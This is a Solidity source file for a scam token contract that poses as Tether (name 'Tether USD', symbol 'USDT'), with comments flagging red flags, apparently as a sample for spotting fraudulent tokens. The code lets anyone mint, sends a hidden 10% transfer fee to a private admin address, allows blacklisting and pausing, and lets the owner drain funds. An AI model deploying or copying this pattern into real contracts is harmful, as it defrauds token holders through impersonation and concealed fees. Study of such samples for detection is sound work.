// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract FakeToken {
    string public name = "Tether USD";
    string public symbol = "USDT";
    uint8 public decimals = 6;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public blacklisted;

    address public owner;
    address private hiddenAdmin;
    bool private paused;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() {
        owner = msg.sender;
        hiddenAdmin = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    function mint(address to, uint256 amount) public {
        // Red flag #1: anyone can mint tokens
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        require(!paused, "Paused");
        require(!blacklisted[msg.sender], "Sender blacklisted");
        require(!blacklisted[to], "Recipient blacklisted");
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");

        uint256 fee = (amount * 10) / 100;
        uint256 finalAmount = amount - fee;

        balanceOf[msg.sender] -= amount;
        balanceOf[to] += finalAmount;
        balanceOf[hiddenAdmin] += fee;

        emit Transfer(msg.sender, to, finalAmount);
        return true;
    }

    function addToBlacklist(address user) public onlyOwner {
        blacklisted[user] = true;
    }

    function setPaused(bool _paused) public onlyOwner {
        paused = _paused;
    }

    function setHiddenAdmin(address newAdmin) public onlyOwner {
        hiddenAdmin = newAdmin;
    }

    function drain() public onlyOwner {
        // Red flag #2: owner can drain contract funds
        payable(owner).transfer(address(this).balance);
    }
}
